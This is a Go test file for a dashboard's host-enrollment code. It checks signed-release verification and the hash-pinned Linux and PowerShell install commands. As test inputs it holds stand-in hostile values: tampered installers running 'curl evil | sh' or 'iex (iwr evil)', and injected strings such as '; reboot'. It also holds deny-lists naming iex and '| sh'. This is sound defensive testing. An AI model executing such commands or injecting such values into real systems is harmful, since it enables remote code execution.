package enrollment

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/n3ptune-cpu/Fairy-agent/pkg/release"
	"github.com/n3ptune-cpu/Fairy-dashboard/internal/config"
	"github.com/n3ptune-cpu/Fairy-dashboard/internal/managed"
)

var testInstallers = Installers{Repo: "n3ptune-cpu/Fairy-agent", Tag: "build-7", Version: "7-6155fe6",
	Base: "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7",
	SH:   strings.Repeat("a1", 32), PS1: strings.Repeat("b2", 32), Sums: strings.Repeat("c3", 32), PinSH: true, PinPS1: true,
	PairV2SH: true, PairV2PS1: true, StdinSH: true, EnvPS1: true, MemoryPS1: true}

// A join code as the panel makes it, for the command tests.
const testCode = "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43U"

// fakeRelease is a GitHub release download folder signed with a fresh key.
type fakeRelease struct {
	files map[string][]byte
	hits  atomic.Int32
	srv   *httptest.Server
	pub   string
}

// v0.4.3-style installers: they take the panel's hash of SHA256SUMS (and the join code on the command line).
const (
	shWithPin  = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --join) CODE=\"$2\"; shift ;;\n    --sums-sha256) SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
	ps1WithPin = "param(\n    [Parameter(Mandatory = $true)][string]$Join,\n    [switch]$Ipmi,\n    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n"
)

// Installers as Fairy-agent ships them from v0.6.0 on: the option lines the panel looks for, as they stand in
// deploy/install.sh and deploy/install.ps1 there (pinned on that side by pkg/release/deploy_test.go).
const (
	shCurrent = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --join) [ $# -ge 2 ] || die \"--join needs the code\"; CODE=\"$2\"; CODE_ARG=1; shift ;;\n" +
		"    --join-stdin) CODE_STDIN=1 ;;\n    --pair-v2) PAIRV2=1 ;;\n    --sums-sha256) [ $# -ge 2 ] || die \"x\"; SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
	ps1Current = "param(\n    [string]$Join = '',\n    [Parameter(Mandatory = $true)][string]$PanelAddress,\n    [switch]$PairV2,\n    [switch]$Ipmi,\n" +
		"    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n$code = $Join\nif (-not $code) { $code = $env:FAIRY_JOIN_CODE }\nRemove-Item Env:FAIRY_JOIN_CODE\n"
)

func newFakeRelease(t *testing.T, version string, scripts ...string) *fakeRelease {
	t.Helper()
	pub, priv, err := release.GenerateKey()
	if err != nil {
		t.Fatal(err)
	}
	k, _ := release.ParsePrivateKey(priv)
	f := &fakeRelease{pub: pub, files: map[string][]byte{
		InstallSH:           []byte("#!/bin/sh\necho installing\n"),
		InstallPS1:          []byte("Write-Host installing\n"),
		release.VersionFile: []byte("fairy-agent " + version + "\n"),
	}}
	if len(scripts) == 2 {
		f.files[InstallSH], f.files[InstallPS1] = []byte(scripts[0]), []byte(scripts[1])
	}
	f.files[release.SumsFile] = release.FormatSums([]string{release.VersionFile, InstallSH, InstallPS1}, f.files)
	f.files[release.SigFile] = release.Sign(k, f.files[release.SumsFile])
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		name, ok := strings.CutPrefix(r.URL.Path, "/n3ptune-cpu/Fairy-agent/releases/download/build-7/")
		b, found := f.files[name]
		if !ok || !found {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(b)
	}))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakeRelease) verifier(t *testing.T, version string) *Verifier {
	t.Helper()
	key, err := release.ParsePublicKey(f.pub)
	if err != nil {
		t.Fatal(err)
	}
	v := NewVerifier("n3ptune-cpu/Fairy-agent", "build-7", version, key)
	v.HTTP, v.DownloadBase, v.Hosts = f.srv.Client(), f.srv.URL, []string{"127.0.0.1"}
	return v
}

func hexSum(b []byte) string { h := sha256.Sum256(b); return hex.EncodeToString(h[:]) }

// The panel shows a command only for the pinned release's install scripts, checked with its release key; the
// result is kept (one download per panel run).
func TestVerifierChecksThePinnedRelease(t *testing.T) {
	f := newFakeRelease(t, "7-6155fe6")
	v := f.verifier(t, "7-6155fe6")
	in, err := v.Installers(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if in.Tag != "build-7" || in.Version != "7-6155fe6" || in.SH != hexSum(f.files[InstallSH]) || in.PS1 != hexSum(f.files[InstallPS1]) ||
		in.Sums != hexSum(f.files[release.SumsFile]) || in.PinSH || in.PinPS1 || in.PairV2SH || in.PairV2PS1 ||
		in.Base != f.srv.URL+"/n3ptune-cpu/Fairy-agent/releases/download/build-7" {
		t.Fatalf("%+v", in)
	}
	n := f.hits.Load()
	if _, err := v.Installers(context.Background()); err != nil || f.hits.Load() != n {
		t.Fatal("a checked release is downloaded again", err)
	}
	if v.Label() != "build-7 (fairy-agent 7-6155fe6)" {
		t.Fatal(v.Label())
	}
}

func TestVerifierRefuses(t *testing.T) {
	cases := map[string]struct {
		version string // the version the verifier expects
		mod     func(f *fakeRelease)
		want    string
	}{
		"no key":             {"7-6155fe6", func(f *fakeRelease) { f.pub = "" }, "no release signing key"},
		"other key":          {"7-6155fe6", func(f *fakeRelease) { p, _, _ := release.GenerateKey(); f.pub = p }, "signature does not match"},
		"tampered install":   {"7-6155fe6", func(f *fakeRelease) { f.files[InstallSH] = []byte("#!/bin/sh\ncurl evil | sh\n") }, "does not match"},
		"tampered ps1":       {"7-6155fe6", func(f *fakeRelease) { f.files[InstallPS1] = []byte("iex (iwr evil)") }, "does not match"},
		"tampered sums":      {"7-6155fe6", func(f *fakeRelease) { f.files[release.SumsFile] = append(f.files[release.SumsFile], 'x') }, "signature"},
		"other version":      {"8-0000000", func(*fakeRelease) {}, "expected 8-0000000"},
		"missing script":     {"7-6155fe6", func(f *fakeRelease) { delete(f.files, InstallPS1) }, "HTTP 404"},
		"huge file":          {"7-6155fe6", func(f *fakeRelease) { f.files[release.SigFile] = make([]byte, maxSmall+1) }, "larger than"},
		"panel release":      {"7-6155fe6", func(f *fakeRelease) { f.files[release.VersionFile] = []byte("fairy 7-6155fe6\n") }, "does not match"},
		"unsigned extra sum": {"7-6155fe6", func(f *fakeRelease) { f.files[release.SigFile] = []byte("bm90IGEgc2lnbmF0dXJl\n") }, "signature"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			f := newFakeRelease(t, "7-6155fe6")
			c.mod(f)
			var v *Verifier
			if f.pub == "" {
				v = NewVerifier("n3ptune-cpu/Fairy-agent", "build-7", c.version, nil)
			} else {
				v = f.verifier(t, c.version)
			}
			_, err := v.Installers(context.Background())
			var u *Unavailable
			if err == nil || !errors.As(err, &u) || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("got %v, want an Unavailable error with %q", err, c.want)
			}
		})
	}
}

// Downloads stay on https GitHub hosts (redirects too); a failure is retried only after a pause.
func TestVerifierHostsAndRetry(t *testing.T) {
	f := newFakeRelease(t, "7-6155fe6")
	v := f.verifier(t, "7-6155fe6")
	v.Hosts = []string{"github.com"}
	now := time.Unix(1_000_000, 0)
	v.Now = func() time.Time { return now }
	if _, err := v.Installers(context.Background()); err == nil || !strings.Contains(err.Error(), "only https from GitHub") {
		t.Fatal(err)
	}
	v.Hosts = []string{"127.0.0.1"}
	if _, err := v.Installers(context.Background()); err == nil {
		t.Fatal("retried at once")
	}
	now = now.Add(retryWait + time.Second)
	if _, err := v.Installers(context.Background()); err != nil {
		t.Fatal(err)
	}
	redir := httptest.NewTLSServer(http.RedirectHandler("http://example.com/x", http.StatusFound))
	defer redir.Close()
	v2 := f.verifier(t, "")
	v2.HTTP, v2.DownloadBase = redir.Client(), redir.URL
	if _, err := v2.Installers(context.Background()); err == nil || !strings.Contains(err.Error(), "only https from GitHub") {
		t.Fatal("redirect to plain http followed:", err)
	}
}

// Create shows no code and no command without a checked script.
func TestCreateNeedsCheckedScript(t *testing.T) {
	m := &Manager{PanelAddr: "100.64.0.10", items: map[string]*Enrollment{}, Hooks: Hooks{Config: func() *config.Panel { return &config.Panel{} }}}
	req := Request{Name: "srv-winpc", OS: "linux"}
	_, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil)
	var u *Unavailable
	if !errors.As(err, &u) || len(m.items) != 0 {
		t.Fatal("no script source:", err)
	}
	m.Scripts = PinnedVerifier("n3ptune-cpu/Fairy-agent", "", nil) // a build without the release key
	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil); !errors.As(err, &u) || len(m.items) != 0 {
		t.Fatal("no key:", err)
	}
	m.Scripts = Fixed{Base: "https://github.com/x/y/releases/download/build-7; curl evil", SH: testInstallers.SH, PS1: testInstallers.PS1}
	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil); !errors.As(err, &u) {
		t.Fatal("unsafe base accepted:", err)
	}
}

// The two command lines, exactly: they are the lines of the Fairy-agent install scripts' own contract
// (Fairy-agent reports/A4, "Install command lines"; pinned there by pkg/release/deploy_test.go).
func TestCommandsPinTheCheckedRelease(t *testing.T) {
	const base = "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7"
	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, testCode, "100.64.0.10")
	want := `$u='` + base + `'; $b=(New-Object Net.WebClient).DownloadData("$u/install.ps1"); ` +
		`if ((([Security.Cryptography.SHA256]::Create().ComputeHash($b) | ForEach-Object { $_.ToString('x2') }) -join '') -eq '` + testInstallers.PS1 + `') ` +
		`{ $env:FAIRY_JOIN_CODE='` + testCode + `'; try { & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))) -ReleaseUrl $u -SumsSha256 ` + testInstallers.Sums +
		` -PanelAddress 100.64.0.10 -PairV2 -PowerControl -UpsName ups1 } finally { Remove-Item Env:FAIRY_JOIN_CODE -ErrorAction SilentlyContinue } } ` +
		`else { throw 'install.ps1 is not the release the panel checked: not run' }`
	if win != want {
		t.Fatalf("\n got %s\nwant %s", win, want)
	}
	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, testCode, "100.64.0.10")
	want = `f=$(mktemp) && curl -fsSL --proto '=https' -o "$f" ` + base + `/install.sh && ` +
		`echo "` + testInstallers.SH + `  $f" | sha256sum -c - && printf '%s' '` + testCode + `' | sudo env FAIRY_RELEASE_URL=` + base +
		` sh "$f" --sums-sha256 ` + testInstallers.Sums + ` --join-stdin --pair-v2 --panel 100.64.0.10 --self-update`
	if lin != want {
		t.Fatalf("\n got %s\nwant %s", lin, want)
	}
	// a Proxmox node: a root shell, the same line without sudo
	node := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.64.0.10")
	if node != strings.Replace(strings.Replace(want, "| sudo env ", "| env ", 1), " --self-update", " --proxmox", 1) {
		t.Fatal(node)
	}
	// every option, in the order the scripts' usage lines give
	all := managed.Options{PowerControl: true, SelfUpdate: true, WolRelay: true, UPS: true, CoreTemp: true, IPMI: true}
	if c := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true, Options: all}, testCode, "100.64.0.10"); !strings.HasSuffix(c,
		" --panel 100.64.0.10 --power-control --self-update --wol --ipmi --proxmox --ups") {
		t.Fatal(c)
	}
	if c := Command(testInstallers, managed.Host{OS: "windows", Options: all}, testCode, "100.64.0.10"); !strings.Contains(c,
		" -PanelAddress 100.64.0.10 -PairV2 -PowerControl -SelfUpdate -Wol -CoreTemp -Ipmi -Ups } finally { ") {
		t.Fatal(c)
	}
	for _, c := range []string{win, lin, node} {
		if strings.Contains(c, "latest") || strings.Contains(c, "curl -fsSL https") || strings.Contains(c, "| sh ") || strings.Contains(c, "iex") ||
			strings.Contains(c, "Invoke-Expression") {
			t.Fatal("unpinned, or a download run unchecked:", c)
		}
	}
}

// L20: the join code is on no program's command line. In both lines it appears exactly once: as the argument
// of the shell's own printf (Linux), and in an assignment to an environment variable of the PowerShell window
// (Windows). The old forms (--join CODE, -Join CODE) are gone.
func TestCommandKeepsTheJoinCodeOffCommandLines(t *testing.T) {
	for _, os := range []string{"linux", "windows"} {
		for _, node := range []bool{false, true} {
			h := managed.Host{OS: os, ProxmoxWanted: node && os == "linux", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}
			c := Command(testInstallers, h, testCode, "100.64.0.10")
			if strings.Count(c, testCode) != 1 {
				t.Fatalf("the code must be in the line exactly once: %s", c)
			}
			for _, old := range []string{"--join " + testCode, "--join=" + testCode, "-Join ", "--code", "powershell -ExecutionPolicy", "-File "} {
				if strings.Contains(c, old) {
					t.Errorf("%s: the line still has %q: %s", os, old, c)
				}
			}
			if os == "linux" && !strings.Contains(c, `&& printf '%s' '`+testCode+`' | `) {
				t.Error("linux: the code must be printed by the shell's builtin into the installer's standard input:", c)
			}
			if os == "linux" && !regexp.MustCompile(`sh "\$f" --sums-sha256 [0-9a-f]{64} --join-stdin --pair-v2 --panel `).MatchString(c) {
				t.Error(c)
			}
			if os == "windows" && !strings.Contains(c, `') { $env:FAIRY_JOIN_CODE='`+testCode+`'; try { & (`) {
				t.Error("windows: the code must be set as an environment variable of the window:", c)
			}
		}
	}
}

// L29: the Windows line keeps no file between checking the script and running it: it downloads into memory,
// hashes those bytes and runs those bytes. No temp file, no second PowerShell given a path.
func TestWindowsCommandRunsTheCheckedBytesFromMemory(t *testing.T) {
	c := Command(testInstallers, managed.Host{OS: "windows"}, testCode, "100.64.0.10")
	for _, gone := range []string{"$env:TEMP", "fairy-install.ps1", "-OutFile", "Get-FileHash", "iwr ", "Invoke-WebRequest", "-File", "$f"} {
		if strings.Contains(c, gone) {
			t.Errorf("the line still uses %q: %s", gone, c)
		}
	}
	for _, want := range []string{`$b=(New-Object Net.WebClient).DownloadData("$u/install.ps1")`, `ComputeHash($b)`,
		`[scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))`, `-eq '` + testInstallers.PS1 + `') { $env:`} {
		if !strings.Contains(c, want) {
			t.Errorf("the line lacks %q: %s", want, c)
		}
	}
	// the three uses of $b are the download, the hash and the run: the bytes that are checked are the bytes that run
	if strings.Count(c, "$b") != 3 {
		t.Error(c)
	}
	// the check, then the code, then the run, then the refusal: all inside one statement
	at := func(sub string) int { return strings.Index(c, sub) }
	if !(at("-eq '") < at("FAIRY_JOIN_CODE") && at("FAIRY_JOIN_CODE") < at("scriptblock") && at("scriptblock") < at("throw ")) {
		t.Error("order:", c)
	}
}

// N3 of the Windows review: with the check and the run as two statements ("if (hash -ne X) { throw }; run"),
// a hash expression that itself fails skipped the check and the next statement ran the unchecked script: in
// PowerShell an exception from a .NET call ends only the statement it is in. The run is now the body of the
// "if" that makes the check, the refusal is its "else", and nothing comes after that one statement, whatever
// options the line carries. The join code is on no command line and leaves the environment in "finally".
func TestWindowsCommandRunsOnlyInsideTheCheck(t *testing.T) {
	all := managed.Options{PowerControl: true, SelfUpdate: true, WolRelay: true, CoreTemp: true, IPMI: true, UPS: true}
	named := all
	named.UPSName = "ups1"
	for name, o := range map[string]managed.Options{"no options": {}, "every option": all, "a named UPS": named} {
		c := Command(testInstallers, managed.Host{OS: "windows", Options: o}, testCode, "100.64.0.10")
		const check = `if ((([Security.Cryptography.SHA256]::Create().ComputeHash($b) | ForEach-Object { $_.ToString('x2') }) -join '') -eq '`
		const tail = ` } finally { Remove-Item Env:FAIRY_JOIN_CODE -ErrorAction SilentlyContinue } } else { throw 'install.ps1 is not the release the panel checked: not run' }`
		head := `$u='` + testInstallers.Base + `'; $b=(New-Object Net.WebClient).DownloadData("$u/install.ps1"); ` + check + testInstallers.PS1 +
			`') { $env:FAIRY_JOIN_CODE='` + testCode + `'; try { & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))) -ReleaseUrl $u -SumsSha256 `
		if !strings.HasPrefix(c, head) || !strings.HasSuffix(c, tail) {
			t.Fatalf("%s: the line is not the checked form:\n%s", name, c)
		}
		// three statements, and the third is the "if ... else": no statement can run after a check that failed
		// or could not be made. (Between head and tail there are only the script's own parameters.)
		middle := strings.TrimSuffix(strings.TrimPrefix(c, head), tail)
		if strings.ContainsAny(middle, ";{}|&`$()'\"\n") {
			t.Errorf("%s: something other than plain parameters between the run and the end of the line: %q", name, middle)
		}
		if n := strings.Count(c, "; "); n != 3 { // $u=...; $b=...; and the one inside the body: $env:...; try
			t.Errorf("%s: %d statement separators, want 3: %s", name, n, c)
		}
		for _, bad := range []string{"-ne '", "} ; ", "}; ", "$ErrorActionPreference", "-Join", "-EncodedCommand", "iex", "Invoke-Expression"} {
			if strings.Contains(c, bad) {
				t.Errorf("%s: the line contains %q: %s", name, bad, c)
			}
		}
		if strings.Count(c, testCode) != 1 || strings.Count(c, "throw ") != 1 || strings.Count(c, " else ") != 1 ||
			strings.Count(c, "{") != strings.Count(c, "}") || strings.Count(c, "(") != strings.Count(c, ")") {
			t.Errorf("%s: %s", name, c)
		}
	}
}

// Command makes no line at all from parts it would not make itself: a code or address in another shape, a UPS
// name with other characters, an unchecked release, or a release whose script cannot take the new line.
func TestCommandRefusesUnsafeParts(t *testing.T) {
	ok := managed.Host{OS: "linux"}
	if Command(testInstallers, ok, testCode, "100.64.0.10") == "" {
		t.Fatal("the plain case")
	}
	for name, c := range map[string]string{
		"code with a quote":       Command(testInstallers, ok, "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43'", "100.64.0.10"),
		"code with a command":     Command(testInstallers, ok, "x'; curl evil | sh; '", "100.64.0.10"),
		"code without dashes":     Command(testInstallers, ok, "MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43U", "100.64.0.10"),
		"lower-case code":         Command(testInstallers, ok, strings.ToLower(testCode), "100.64.0.10"),
		"empty code":              Command(testInstallers, ok, "", "100.64.0.10"),
		"panel with a command":    Command(testInstallers, ok, testCode, "100.64.0.10; reboot"),
		"panel as a name":         Command(testInstallers, ok, testCode, "panel.example.com"),
		"panel IPv6":              Command(testInstallers, ok, testCode, "fd7a:115c:a1e0::5"),
		"UPS name with a command": Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{UPSName: "ups1; reboot"}}, testCode, "100.64.0.10"),
		"UPS name, PowerShell":    Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{UPSName: "u'; calc; '"}}, testCode, "100.64.0.10"),
	} {
		if c != "" {
			t.Errorf("%s: a line was made: %s", name, c)
		}
	}
	for name, change := range map[string]func(*Installers){
		"unsafe base":           func(in *Installers) { in.Base += "; curl evil" },
		"no script hash":        func(in *Installers) { in.SH = "" },
		"no fingerprint":        func(in *Installers) { in.Sums = "" },
		"script without pin":    func(in *Installers) { in.PinSH, in.PinPS1 = false, false },
		"script without v2":     func(in *Installers) { in.PairV2SH, in.PairV2PS1 = false, false },
		"script needs the code": func(in *Installers) { in.StdinSH, in.EnvPS1 = false, false },
	} {
		in := testInstallers
		change(&in)
		if l, w := Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10"), Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10"); l != "" || w != "" {
			t.Errorf("%s: a line was made:\n%s\n%s", name, l, w)
		}
	}
	in := testInstallers
	in.MemoryPS1 = false // only Windows needs it
	if Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10") != "" || Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10") == "" {
		t.Error("install.ps1 that cannot run from memory")
	}
}

// The Linux command really refuses a script that is not the checked one, and runs the checked one against the
// pinned release with the join code on its standard input and nowhere in its arguments (curl is replaced by a
// copy from a local folder; a root shell, as on a Proxmox node).
func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("POSIX shell and sha256sum")
	}
	for _, tool := range []string{"sh", "sha256sum", "mktemp"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skip(tool + " missing")
		}
	}
	dir := t.TempDir()
	bin := filepath.Join(dir, "bin")
	if err := os.MkdirAll(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	served := filepath.Join(dir, "served-install.sh")
	// fake curl: copies the "downloaded" file to the -o target
	curl := "#!/bin/sh\nout=\nwhile [ $# -gt 0 ]; do case \"$1\" in -o) out=\"$2\"; shift;; esac; shift; done\ncp \"" + served + "\" \"$out\"\n"
	if err := os.WriteFile(filepath.Join(bin, "curl"), []byte(curl), 0o755); err != nil {
		t.Fatal(err)
	}
	marker, stdin := filepath.Join(dir, "ran"), filepath.Join(dir, "stdin")
	// the stand-in installer records its release, its arguments and what it reads from standard input (one
	// line without a line end, as install.sh reads the code: `IFS= read -r CODE || [ -n "$CODE" ]`)
	script := []byte("#!/bin/sh\necho \"$FAIRY_RELEASE_URL $*\" > \"" + marker + "\"\nIFS= read -r CODE || [ -n \"$CODE\" ]\nprintf '%s' \"$CODE\" > \"" + stdin + "\"\n")
	in := testInstallers
	in.SH = hexSum(script)
	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.64.0.10")
	run := func() (string, error) {
		os.Remove(marker)
		os.Remove(stdin)
		c := exec.Command("sh", "-c", cmd)
		c.Env = append(os.Environ(), "PATH="+bin+":"+os.Getenv("PATH"))
		out, err := c.CombinedOutput()
		return string(out), err
	}
	if err := os.WriteFile(served, []byte("#!/bin/sh\necho tampered > \""+marker+"\"\ncat > \""+stdin+"\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := run(); err == nil {
		t.Fatal("a tampered script passed the check:", out)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("the tampered script ran")
	}
	if _, err := os.Stat(stdin); err == nil {
		t.Fatal("the tampered script was given the join code")
	}
	if err := os.WriteFile(served, script, 0o644); err != nil {
		t.Fatal(err)
	}
	out, err := run()
	if err != nil {
		t.Fatal(err, out)
	}
	got, _ := os.ReadFile(marker)
	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join-stdin --pair-v2 --panel 100.64.0.10 --proxmox\n" {
		t.Fatalf("%q", got)
	}
	if code, _ := os.ReadFile(stdin); string(code) != testCode {
		t.Fatalf("standard input of the installer: %q", code)
	}
	if strings.Contains(string(got), testCode) || strings.Contains(out, testCode) {
		t.Fatal("the join code is in the installer's arguments or in the output")
	}
}

// AgentModule must follow go.mod: when Fairy-agent is bumped there, the pinned release must be bumped too.
func TestPinnedReleaseFollowsGoMod(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "go.mod"))
	if err != nil {
		t.Fatal(err)
	}
	m := regexp.MustCompile(`(?m)^\s*github\.com/n3ptune-cpu/Fairy-agent (v\S+)`).FindSubmatch(b)
	if m == nil || string(m[1]) != AgentModule {
		t.Fatalf("go.mod requires Fairy-agent %s, the pinned release is for %s: update AgentModule, AgentReleaseTag and AgentReleaseVersion", m[1], AgentModule)
	}
	if !regexp.MustCompile(`^build-\d+$`).MatchString(AgentReleaseTag) || !strings.HasPrefix(AgentReleaseVersion, strings.TrimPrefix(AgentReleaseTag, "build-")+"-") {
		t.Fatal("tag and version disagree", AgentReleaseTag, AgentReleaseVersion)
	}
}

// The command passes the hash of the exact SHA256SUMS bytes the panel verified. A release whose script does
// not take it (older than Fairy-agent v0.4.3) gets no command.
func TestCommandsPassTheVerifiedSumsHash(t *testing.T) {
	f := newFakeRelease(t, "20-abcdef0", shCurrent, ps1Current)
	in, err := f.verifier(t, "20-abcdef0").Installers(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	sums := hexSum(f.files[release.SumsFile])
	if !in.PinSH || !in.PinPS1 || in.Sums != sums || len(in.Lacks("linux")) != 0 || len(in.Lacks("windows")) != 0 {
		t.Fatalf("%+v", in)
	}
	lin := Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10")
	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join-stdin --pair-v2 --panel 100.64.0.10`) {
		t.Fatal(lin)
	}
	win := Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10")
	if !strings.Contains(win, ` -ReleaseUrl $u -SumsSha256 `+sums+` -PanelAddress 100.64.0.10 -PairV2`) {
		t.Fatal(win)
	}
	bad := in
	bad.Sums = "not-a-hash; curl evil"
	if bad.valid() || Command(bad, managed.Host{OS: "linux"}, testCode, "100.64.0.10") != "" {
		t.Fatal("unsafe sums hash accepted")
	}
	// the scripts of v0.4.3 to v0.5.x take the fingerprint but not the rest: no command
	f2 := newFakeRelease(t, "13-d43fdaf", shWithPin, ps1WithPin)
	in2, err := f2.verifier(t, "").Installers(context.Background())
	if err != nil || !in2.PinSH || !in2.PinPS1 || len(in2.Lacks("linux")) != 2 || len(in2.Lacks("windows")) != 2 {
		t.Fatalf("%+v %v", in2, err)
	}
	if Command(in2, managed.Host{OS: "linux"}, testCode, "100.64.0.10") != "" || Command(in2, managed.Host{OS: "windows"}, testCode, "100.64.0.10") != "" {
		t.Fatal("a command for a release that cannot take it")
	}
}

// The two lines in the guide are the lines the panel prints, value for value (README.md "Add host"; the
// agent's guide shows the same two). A change to Command that is not made in the guide fails here.
func TestGuideShowsTheLinesThePanelPrints(t *testing.T) {
	raw, err := os.ReadFile("../../README.md")
	if err != nil {
		t.Fatal(err)
	}
	guide := map[string]string{}
	for _, l := range strings.Split(string(raw), "\n") {
		switch {
		case strings.HasPrefix(l, "$u='BASE'; "):
			guide["windows"] = l
		case strings.HasPrefix(l, "f=$(mktemp) && curl "):
			guide["linux"] = l
		}
	}
	shape := strings.NewReplacer(testInstallers.Base, "BASE", testInstallers.SH, "SH_HASH", testInstallers.PS1, "PS1_HASH",
		testInstallers.Sums, "SUMS", testCode, "CODE", "100.64.0.10", "PANEL")
	// where the options go: before the end of the run on Windows, at the end of the line on Linux
	options := strings.NewReplacer(" -PairV2 }", " -PairV2 [options] }", " --panel PANEL", " --panel PANEL [options]")
	for os := range guide {
		c := options.Replace(shape.Replace(Command(testInstallers, managed.Host{OS: os}, testCode, "100.64.0.10")))
		if c != guide[os] {
			t.Errorf("%s: the guide's line is not the panel's line.\nguide: %s\npanel: %s", os, guide[os], c)
		}
	}
	if len(guide) != 2 {
		t.Fatalf("found %d of the two command lines in README.md", len(guide))
	}
}
